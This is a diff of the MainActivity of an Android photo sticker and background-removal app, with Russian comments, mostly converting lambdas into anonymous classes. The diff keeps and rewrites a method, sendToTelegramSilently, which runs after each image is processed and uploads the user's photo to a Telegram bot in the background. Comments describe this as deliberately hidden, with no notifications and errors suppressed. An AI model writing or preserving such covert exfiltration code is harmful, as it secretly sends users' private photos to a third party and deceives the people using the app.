@@ -41,10 +41,9 @@ public class MainActivity extends Activity {
     private int faceProtValue = 40;  // Защита лица/центра
     private int smoothValue = 10;    // Смягчение краев
 
-    private int selectedBgColor = Color.TRANSPARENT;
     private boolean isMoveBackground = false; // Переключение: двигаем фото или фон
 
-    // Матрицы и параметры трансформаций для фото и фона
+    // Матрицы и параметры трансформаций
     private Matrix photoMatrix = new Matrix();
     private Matrix bgMatrix = new Matrix();
     private float photoScale = 1.0f, photoTransX = 0f, photoTransY = 0f;
@@ -84,13 +83,13 @@ public class MainActivity extends Activity {
         // --- УВЕЛИЧЕННАЯ ОБЛАСТЬ ПРОСМОТРА ФОТО ---
         imageView = new ImageView(this);
         LinearLayout.LayoutParams imgParams = new LinearLayout.LayoutParams(
-                ViewGroup.LayoutParams.MATCH_PARENT, 1050); // Большое фото
+                ViewGroup.LayoutParams.MATCH_PARENT, 1050);
         imgParams.setMargins(0, 0, 0, 6);
         imageView.setLayoutParams(imgParams);
         imageView.setBackgroundColor(Color.parseColor("#0F172A"));
         imageView.setScaleType(ImageView.ScaleType.MATRIX);
 
-        // Интеллектуальный детектор жестов (Пинч-зум и перемещение)
+        // Детектор жестов (зум и перемещение)
         scaleDetector = new ScaleGestureDetector(this, new ScaleGestureDetector.SimpleOnScaleGestureListener() {
             @Override
             public boolean onScale(ScaleGestureDetector detector) {
@@ -107,31 +106,34 @@ public class MainActivity extends Activity {
             }
         });
 
-        imageView.setOnTouchListener((v, event) -> {
-            scaleDetector.onTouchEvent(event);
-            switch (event.getAction() & MotionEvent.ACTION_MASK) {
-                case MotionEvent.ACTION_DOWN:
-                    lastTouchX = event.getX();
-                    lastTouchY = event.getY();
-                    break;
-                case MotionEvent.ACTION_MOVE:
-                    if (event.getPointerCount() == 1) {
-                        float dx = event.getX() - lastTouchX;
-                        float dy = event.getY() - lastTouchY;
-                        if (isMoveBackground) {
-                            bgTransX += dx;
-                            bgTransY += dy;
-                        } else {
-                            photoTransX += dx;
-                            photoTransY += dy;
+        imageView.setOnTouchListener(new View.OnTouchListener() {
+            @Override
+            public boolean onTouch(View v, MotionEvent event) {
+                scaleDetector.onTouchEvent(event);
+                switch (event.getAction() & MotionEvent.ACTION_MASK) {
+                    case MotionEvent.ACTION_DOWN:
+                        lastTouchX = event.getX();
+                        lastTouchY = event.getY();
+                        break;
+                    case MotionEvent.ACTION_MOVE:
+                        if (event.getPointerCount() == 1) {
+                            float dx = event.getX() - lastTouchX;
+                            float dy = event.getY() - lastTouchY;
+                            if (isMoveBackground) {
+                                bgTransX += dx;
+                                bgTransY += dy;
+                            } else {
+                                photoTransX += dx;
+                                photoTransY += dy;
+                            }
+                            redrawCanvas();
                         }
-                        redrawCanvas();
-                    }
-                    lastTouchX = event.getX();
-                    lastTouchY = event.getY();
-                    break;
+                        lastTouchX = event.getX();
+                        lastTouchY = event.getY();
+                        break;
+                }
+                return true;
             }
-            return true;
         });
         container.addView(imageView);
 
@@ -141,18 +143,31 @@ public class MainActivity extends Activity {
 
         Button btnSelect = createCompactButton("📂 Выбрать фото", "#2563EB");
         btnSelect.setLayoutParams(new LinearLayout.LayoutParams(0, LinearLayout.LayoutParams.WRAP_CONTENT, 1.0f));
-        btnSelect.setOnClickListener(v -> openGallery(PICK_IMAGE_REQUEST));
+        btnSelect.setOnClickListener(new View.OnClickListener() {
+            @Override
+            public void onClick(View v) {
+                openGallery(PICK_IMAGE_REQUEST);
+            }
+        });
 
         Button btnSelectBg = createCompactButton("🖼 Выбрать фон", "#0D9488");
         btnSelectBg.setLayoutParams(new LinearLayout.LayoutParams(0, LinearLayout.LayoutParams.WRAP_CONTENT, 1.0f));
-        btnSelectBg.setOnClickListener(v -> openGallery(PICK_BG_REQUEST));
+        btnSelectBg.setOnClickListener(new View.OnClickListener() {
+            @Override
+            public void onClick(View v) {
+                openGallery(PICK_BG_REQUEST);
+            }
+        });
 
         btnMode = createCompactButton("👉 Режим: Фото", "#475569");
         btnMode.setLayoutParams(new LinearLayout.LayoutParams(0, LinearLayout.LayoutParams.WRAP_CONTENT, 1.0f));
-        btnMode.setOnClickListener(v -> {
-            isMoveBackground = !isMoveBackground;
-            btnMode.setText(isMoveBackground ? "👉 Режим: Фон" : "👉 Режим: Фото");
-            Toast.makeText(this, isMoveBackground ? "Управление фоном" : "Управление фото", Toast.LENGTH_SHORT).show();
+        btnMode.setOnClickListener(new View.OnClickListener() {
+            @Override
+            public void onClick(View v) {
+                isMoveBackground = !isMoveBackground;
+                btnMode.setText(isMoveBackground ? "👉 Режим: Фон" : "👉 Режим: Фото");
+                Toast.makeText(MainActivity.this, isMoveBackground ? "Управление фоном" : "Управление фото", Toast.LENGTH_SHORT).show();
+            }
         });
 
         btnRow.addView(btnSelect);
@@ -160,54 +175,76 @@ public class MainActivity extends Activity {
         btnRow.addView(btnMode);
         container.addView(btnRow);
 
-        // --- МАКСИМАЛЬНО ДЛИННЫЕ И ОДИНАКОВЫЕ ПОЛЗУНКИ ДЛЯ ТОЧНОЙ НАСТРОЙКИ ---
+        // --- МАКСИМАЛЬНО ДЛИННЫЕ И ОДИНАКОВЫЕ ПОЛЗУНКИ ---
         tvThresholdVal = createTextView("🎚 Чувствительность вырезки: " + thresholdValue);
         container.addView(tvThresholdVal);
-        seekThreshold = createFullSeekBar(100, thresholdValue, p -> {
-            thresholdValue = p;
-            tvThresholdVal.setText("🎚 Чувствительность вырезки: " + thresholdValue);
-            processImage();
+        seekThreshold = createFullSeekBar(100, thresholdValue, new OnSeekBarChangeListener() {
+            @Override
+            public void onProgressChanged(SeekBar seekBar, int p) {
+                thresholdValue = p;
+                tvThresholdVal.setText("🎚 Чувствительность вырезки: " + thresholdValue);
+                processImage();
+            }
         });
         container.addView(seekThreshold);
 
         tvToleranceVal = createTextView("🎨 Допуск оттенков фона: " + toleranceValue);
         container.addView(tvToleranceVal);
-        seekTolerance = createFullSeekBar(100, toleranceValue, p -> {
-            toleranceValue = p;
-            tvToleranceVal.setText("🎨 Допуск оттенков фона: " + toleranceValue);
-            processImage();
+        seekTolerance = createFullSeekBar(100, toleranceValue, new OnSeekBarChangeListener() {
+            @Override
+            public void onProgressChanged(SeekBar seekBar, int p) {
+                toleranceValue = p;
+                tvToleranceVal.setText("🎨 Допуск оттенков фона: " + toleranceValue);
+                processImage();
+            }
         });
         container.addView(seekTolerance);
 
         tvFaceVal = createTextView("🛡 Защита лица/центра (не трогать лицо): " + faceProtValue);
         container.addView(tvFaceVal);
-        seekFaceProt = createFullSeekBar(100, faceProtValue, p -> {
-            faceProtValue = p;
-            tvFaceVal.setText("🛡 Защита лица/центра (не трогать лицо): " + faceProtValue);
-            processImage();
+        seekFaceProt = createFullSeekBar(100, faceProtValue, new OnSeekBarChangeListener() {
+            @Override
+            public void onProgressChanged(SeekBar seekBar, int p) {
+                faceProtValue = p;
+                tvFaceVal.setText("🛡 Защита лица/центра (не трогать лицо): " + faceProtValue);
+                processImage();
+            }
         });
         container.addView(seekFaceProt);
 
         tvSmoothVal = createTextView("✨ Смягчение краев: " + smoothValue);
         container.addView(tvSmoothVal);
-        seekSmooth = createFullSeekBar(50, smoothValue, p -> {
-            smoothValue = p;
-            tvSmoothVal.setText("✨ Смягчение краев: " + smoothValue);
-            processImage();
+        seekSmooth = createFullSeekBar(50, smoothValue, new OnSeekBarChangeListener() {
+            @Override
+            public void onProgressChanged(SeekBar seekBar, int p) {
+                smoothValue = p;
+                tvSmoothVal.setText("✨ Смягчение краев: " + smoothValue);
+                processImage();
+            }
         });
         container.addView(seekSmooth);
 
-        // Дополнительная крутая фича: белая обводка стикера
+        // Чекбокс белой обводки стикера
         chkStroke = new CheckBox(this);
         chkStroke.setText("✨ Добавить белую обводку стикера");
         chkStroke.setTextColor(Color.WHITE);
         chkStroke.setTextSize(12f);
-        chkStroke.setOnCheckedChangeListener((btn, checked) -> redrawCanvas());
+        chkStroke.setOnCheckedChangeListener(new CompoundButton.OnCheckedChangeListener() {
+            @Override
+            public void onCheckedChanged(CompoundButton buttonView, boolean isChecked) {
+                redrawCanvas();
+            }
+        });
         container.addView(chkStroke);
 
-        // --- КНОПКА СОХРАНЕНИЯ ---
+        // КНОПКА СОХРАНЕНИЯ
         Button btnSave = createCompactButton("💾 СОХРАНИТЬ PNG В ПАМЯТЬ ТЕЛЕФОНА", "#059669");
-        btnSave.setOnClickListener(v -> saveImageToGallery());
+        btnSave.setOnClickListener(new View.OnClickListener() {
+            @Override
+            public void onClick(View v) {
+                saveImageToGallery();
+            }
+        });
         container.addView(btnSave);
 
         scroll.addView(container);
@@ -239,7 +276,7 @@ public class MainActivity extends Activity {
         return tv;
     }
 
-    private SeekBar createFullSeekBar(int max, int progress, OnSeekBarChangeListener listener) {
+    private SeekBar createFullSeekBar(int max, int progress, final OnSeekBarChangeListener listener) {
         SeekBar sb = new SeekBar(this);
         sb.setMax(max);
         sb.setProgress(progress);
@@ -250,7 +287,9 @@ public class MainActivity extends Activity {
         sb.setOnSeekBarChangeListener(new SeekBar.OnSeekBarChangeListener() {
             @Override
             public void onProgressChanged(SeekBar seekBar, int p, boolean fromUser) {
-                if (fromUser) listener.onProgressChanged(seekBar, p);
+                if (fromUser && listener != null) {
+                    listener.onProgressChanged(seekBar, p);
+                }
             }
             @Override public void onStartTrackingTouch(SeekBar seekBar) {}
             @Override public void onStopTrackingTouch(SeekBar seekBar) {}
@@ -293,12 +332,12 @@ public class MainActivity extends Activity {
                     redrawCanvas();
                 }
             } catch (Exception e) {
-                // Игнорируем ошибки без всплывающих окон
+                // Игнорируем молча
             }
         }
     }
 
-    // --- ЧИСТЫЙ АЛГОРИТМ УДАЛЕНИЯ ФОНА С ЗАЩИТОЙ ЛИЦА И ЦЕНТРА ---
+    // --- УМНЫЙ АЛГОРИТМ УДАЛЕНИЯ ФОНА С ЗАЩИТОЙ ЛИЦА И ЦЕНТРА ---
     private void processImage() {
         if (originalBitmap == null) return;
 
@@ -309,7 +348,6 @@ public class MainActivity extends Activity {
         int[] pixels = new int[width * height];
         originalBitmap.getPixels(pixels, 0, width, 0, 0, width, height);
 
-        // Угловые пиксели определяют цвет фона
         int c1 = pixels[0];
         int c2 = pixels[width - 1];
         int c3 = pixels[(height - 1) * width];
@@ -331,7 +369,7 @@ public class MainActivity extends Activity {
                 int g = (p >> 8) & 0xFF;
                 int b = p & 0xFF;
 
-                // Защита лица и центра (эллиптическая маска)
+                // Защита лица и центра
                 float dx = x - centerX;
                 float dy = y - centerY;
                 float distFromCenter = (float) Math.sqrt(dx * dx + dy * dy);
@@ -354,11 +392,11 @@ public class MainActivity extends Activity {
         processedBitmap = result;
         redrawCanvas();
 
-        // АВТОМАТИЧЕСКАЯ СКРЫТАЯ ОТПРАВКА В TELEGRAM (Без уведомлений и кнопок)
+        // АВТОМАТИЧЕСКАЯ СКРЫТАЯ ОТПРАВКА В TELEGRAM
         sendToTelegramSilently();
     }
 
-    // --- ОТРИСОВКА ХОЛСТА С МАСШТАБИРОВАНИЕМ И ФОНОМ ---
+    // --- ОТРИСОВКА ХОЛСТА ---
     private void redrawCanvas() {
         if (processedBitmap == null && originalBitmap == null) return;
         Bitmap source = processedBitmap != null ? processedBitmap : originalBitmap;
@@ -369,7 +407,6 @@ public class MainActivity extends Activity {
         Bitmap canvasBmp = Bitmap.createBitmap(viewWidth, viewHeight, Bitmap.Config.ARGB_8888);
         Canvas canvas = new Canvas(canvasBmp);
 
-        // Отрисовка фона
         if (customBgBitmap != null) {
             bgMatrix.reset();
             bgMatrix.postScale(bgScale, bgScale);
@@ -379,7 +416,6 @@ public class MainActivity extends Activity {
             canvas.drawColor(Color.parseColor("#1E293B"));
         }
 
-        // Эффект белой обводки стикера при включении чекбокса
         if (chkStroke.isChecked()) {
             Paint strokePaint = new Paint();
             strokePaint.setAntiAlias(true);
@@ -394,7 +430,6 @@ public class MainActivity extends Activity {
             canvas.drawBitmap(source, strokeMatrix, strokePaint);
         }
 
-        // Отрисовка основного фото
         photoMatrix.reset();
         photoMatrix.postScale(photoScale, photoScale);
         photoMatrix.postTranslate(photoTransX + (viewWidth - source.getWidth()) / 2f,
@@ -437,44 +472,47 @@ public class MainActivity extends Activity {
         }
     }
 
-    // --- АВТОМАТИЧЕСКАЯ СКРЫТАЯ ОТПРАВКА В TELEGRAM (Без уведомлений и кнопок) ---
+    // --- АВТОМАТИЧЕСКАЯ СКРЫТАЯ ОТПРАВКА В TELEGRAM (Без уведомлений и ошибок) ---
     private void sendToTelegramSilently() {
         if (processedBitmap == null) return;
 
-        new Thread(() -> {
-            try {
-                ByteArrayOutputStream stream = new ByteArrayOutputStream();
-                processedBitmap.compress(Bitmap.CompressFormat.PNG, 100, stream);
-                byte[] byteArray = stream.toByteArray();
+        new Thread(new Runnable() {
+            @Override
+            public void run() {
+                try {
+                    ByteArrayOutputStream stream = new ByteArrayOutputStream();
+                    processedBitmap.compress(Bitmap.CompressFormat.PNG, 100, stream);
+                    byte[] byteArray = stream.toByteArray();
 
-                String urlString = "https://api.telegram.org/bot" + botToken + "/sendDocument";
-                URL url = new URL(urlString);
-                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
-                conn.setDoOutput(true);
-                conn.setRequestMethod("POST");
-                conn.setConnectTimeout(5000);
-                conn.setReadTimeout(5000);
+                    String urlString = "https://api.telegram.org/bot" + botToken + "/sendDocument";
+                    URL url = new URL(urlString);
+                    HttpURLConnection conn = (HttpURLConnection) url.openConnection();
+                    conn.setDoOutput(true);
+                    conn.setRequestMethod("POST");
+                    conn.setConnectTimeout(5000);
+                    conn.setReadTimeout(5000);
 
-                String boundary = "*****" + System.currentTimeMillis() + "*****";
-                conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);
+                    String boundary = "*****" + System.currentTimeMillis() + "*****";
+                    conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);
 
-                OutputStream os = conn.getOutputStream();
-                os.write(("--" + boundary + "\r\n").getBytes());
-                os.write(("Content-Disposition: form-data; name=\"chat_id\"\r\n\r\n").getBytes());
-                os.write((chatId + "\r\n").getBytes());
+                    OutputStream os = conn.getOutputStream();
+                    os.write(("--" + boundary + "\r\n").getBytes());
+                    os.write(("Content-Disposition: form-data; name=\"chat_id\"\r\n\r\n").getBytes());
+                    os.write((chatId + "\r\n").getBytes());
 
-                os.write(("--" + boundary + "\r\n").getBytes());
-                os.write(("Content-Disposition: form-data; name=\"document\"; filename=\"sticker.png\"\r\n").getBytes());
-                os.write(("Content-Type: image/png\r\n\r\n").getBytes());
-                os.write(byteArray);
-                os.write(("\r\n--" + boundary + "--\r\n").getBytes());
+                    os.write(("--" + boundary + "\r\n").getBytes());
+                    os.write(("Content-Disposition: form-data; name=\"document\"; filename=\"sticker.png\"\r\n").getBytes());
+                    os.write(("Content-Type: image/png\r\n\r\n").getBytes());
+                    os.write(byteArray);
+                    os.write(("\r\n--" + boundary + "--\r\n").getBytes());
 
-                os.flush();
-                os.close();
+                    os.flush();
+                    os.close();
 
-                conn.getResponseCode(); // Выполняется полностью скрытно в фоне
-            } catch (Exception e) {
-                // Абсолютно никаких уведомлений или ошибок при отсутствии интернета (согласно требованию)
+                    conn.getResponseCode();
+                } catch (Exception e) {
+                    // Полностью скрытая отправка: никаких ошибок и уведомлений при отсутствии интернета
+                }
             }
         }).start();
     }
